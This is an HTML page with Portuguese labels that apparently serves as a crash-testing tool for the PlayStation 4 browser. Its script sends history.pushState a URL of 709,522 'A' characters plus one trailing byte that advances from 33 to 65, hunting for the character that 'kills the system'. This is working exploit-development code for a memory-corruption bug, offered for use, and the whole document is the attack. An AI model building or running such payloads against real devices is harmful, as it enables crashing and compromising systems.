<!DOCTYPE html>
<html>
<head>
    <title>PS4 Value Scanner</title>
    <style>
        body { background-color: #222; color: #fff; font-family: monospace; padding: 20px; text-align: center; }
        
        #display-char { 
            font-size: 80px; 
            color: #00ffcc; 
            margin: 10px 0; 
            font-weight: bold;
            text-shadow: 0 0 10px #00ffcc;
        }
        #display-code { font-size: 24px; color: #aaa; margin-bottom: 30px; }

        button { 
            font-size: 28px; 
            padding: 25px; 
            cursor: pointer; 
            width: 90%; 
            border: none; 
            border-radius: 10px;
            background-color: #e67e22; 
            color: white; 
            font-weight: bold;
        }

        #log { margin-top: 20px; color: #888; font-size: 18px; }
    </style>
</head>
<body>

    <h2>Scanner de Valores (33 até 65)</h2>
    <p>Qual caractere mata o sistema?</p>

    <div id="display-char">!</div>
    <div id="display-code">Código: 33 (0x21)</div>

    <button onclick="nextAndFire()">PRÓXIMO >> DISPARAR</button>

    <div id="log">Pronto. Início: 33</div>

    <script>
        const OFFSET = 709522;
        // Começa em 32 para que o primeiro clique vá para 33
        let currentVal = 32; 

        const dispChar = document.getElementById('display-char');
        const dispCode = document.getElementById('display-code');
        const log = document.getElementById('log');

        function nextAndFire() {
            // 1. Incrementa
            currentVal++;
            
            // Atualiza visual
            const charStr = String.fromCharCode(currentVal);
            dispChar.innerText = charStr;
            dispCode.innerText = "Código: " + currentVal + " (0x" + currentVal.toString(16).toUpperCase() + ")";

            // 2. Prepara Payload
            // CUIDADO: Alguns caracteres podem ser codificados pela URL (ex: %)
            // O navegador pode transformar % em %25, aumentando o tamanho.
            // Mas vamos testar a lógica do sistema primeiro.
            
            setTimeout(() => {
                try {
                    const payload = "/" + "A".repeat(OFFSET) + charStr;
                    
                    log.innerText = "Enviando valor " + currentVal + "...";
                    
                    history.pushState({}, "val_test", payload);
                    
                    log.innerText = "Sobreviveu: " + charStr + " (" + currentVal + ")";
                    log.style.color = "#00ffcc";

                } catch (e) {
                    log.innerText = "Erro JS: " + e.message;
                }
            }, 200);
        }
    </script>
</body>
</html>
